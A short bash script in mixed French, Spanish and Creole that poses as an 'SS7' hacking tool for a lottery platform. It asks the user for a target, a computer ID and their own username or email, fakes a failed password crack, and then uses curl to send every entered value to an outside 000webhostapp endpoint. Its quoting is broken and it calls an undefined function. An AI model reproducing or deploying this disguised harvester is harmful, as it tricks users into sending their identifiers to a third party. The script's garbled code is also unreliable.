#!/bin/bash
clear


voyeYonMesaj(){
clear

        echo 'By: RESEAU SS7 CYBERSECURITY https://www.reseaux-ss7.io/INTERCEPTION/'
		
		echo 'Entrez le nom de l'entreprise que vous souhaitez pirater'
		read remitente
		clear
		
		echo 'Remitente -->' $remitente
		echo 'Bienvenue sur la plateforme SAINT JEAN LOTTO, vous pouvez ici créer YON FICH sans que le système ne le détecte'
		read receptor
		clear
		
		echo 'Remitente -->' $remitente
		echo 'Bienvenue sur la plateforme SAINT JEAN LOTTO, vous pouvez ici créer YON FICH sans que le système ne le détecte -->' $receptor
		echo 'Entrez le numéro d'identification de l'ordinateur que vous souhaitez interpréter'
		read asunto 
		clear
		
		echo 'Remitente -->' $remitente
		echo 'Bienvenue sur la plateforme SAINT JEAN LOTTO, vous pouvez ici créer YON FICH sans que le système ne le détecte -->' $receptor
		echo 'Entrez le numéro d'identification de l'ordinateur que vous souhaitez interpréter -->' $asunto
		echo 'Entrez votre nom d'utilisateur ou votre adresse e-mail'
		read mensaje
		clear
		
		echo 'Remitente -->' $remitente
		echo 'Kont ki pral resevwa mesaj la -->' $receptor
		echo 'Entrez le numéro d'identification de l'ordinateur que vous souhaitez interpréter -->' $asunto
		echo 'Entrez votre nom d'utilisateur ou votre adresse e-mail -->'$mensaje
		echo '¿Le nom d'utilisateur que vous avez saisi est incorrect... Nous n'avons pas réussi à déchiffrer le mot de passe. Réessayez ou contactez le centre d'aide de SAINT JEAN LOTTO, appuyez sur Y pour essayer de le cracker manuellement? [y/n]' 
		read Seguro
		case $Seguro in
			y)
			curl --data "remitente=$receptor && asunto=$asunto && msj=$mensaje && desde=$remitente" https://insessorial-halls.000webhostapp.com/send.php  
				;;	
			n)
				clear
				Banner 
				menuPrincipal
		esac

}


menuPrincipal(){
clear
	
echo -e '\e[92mRESEAU SS7 '
echo ''
echo 'Bienvenue sur le réseau SS7, ici vous pouvez interpréter et pirater n'importe quel système. Appuyez sur Y pour continuer la simulation'
read opcion
case $opcion in 

	
	y)
	 voyeYonMesaj
	;;
								
	esac

}

Banner 
menuPrincipal
